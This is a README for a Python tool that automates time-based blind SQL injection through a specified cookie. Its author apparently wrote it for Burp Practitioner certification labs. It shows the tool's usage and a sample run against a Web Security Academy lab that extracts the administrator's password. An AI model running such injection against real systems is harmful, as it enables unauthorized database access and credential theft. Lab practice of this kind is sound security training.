# BSQLi
## Description
This tool help to extract data from databases with blind SQLi Injections  
I made this tool while preparing for BURP Practitioner certification. As most labs suggest to inject Blind SQLi in cookie,
this first version injects only in a specified cookie and only extracts password from table 'users' with columns 'username'
and 'password' of a single user.

## Requirements 
This script works with python 3.X
and needs requests module  
`pip3 install requests`

## Usage
```bash
PS C:\BSQLi> python .\bsqli.py -h 
usage: bsqli.py [-h] [-u U] [--cookies COOKIES] [--target TARGET] [--threshold THRESHOLD]

Automate Blind SQLI

optional arguments:
  -h, --help            show this help message and exit
  -u U                  urls to test
  --cookies COOKIES     cookies
  --target TARGET       target cookie to inject
  --threshold THRESHOLD
                        sleep value
  --user USER           User to get password
```
example :
```bash
PS C:\BSQLi> python .\bsqli.py -u https://0ab4006203554a31c012a430005400b3.web-security-academy.net/ --cookies "TrackingId=XKIVlpvhenclkwq9; session=ooCCcMKy1o34VwWinSuRNvyssm3OkZJD" --target TrackingId --threshold 7 --user administrator

         ####    ###    ###   #        #
         #   #  #   #  #   #  #
         #   #  #      #   #  #       ##
         ####    ###   #   #  #        #
         #   #      #  #   #  #        #
         #   #  #   #  #   #  #        #
         ####    ###    ###   #####   ###
                           ##

testing 'https://0ab4006203554a31c012a430005400b3.web-security-academy.net/' for blind SQLi
Will sleep for 7 for the correct values.
[+] Connected to URL
[+] Target injectable
[+] Got user administrator
getting length.....
[+] Length is : 20
Extracting Data ....
blei2n48bania9gh6pgn
[+] Got : blei2n48bania9gh6pgn

```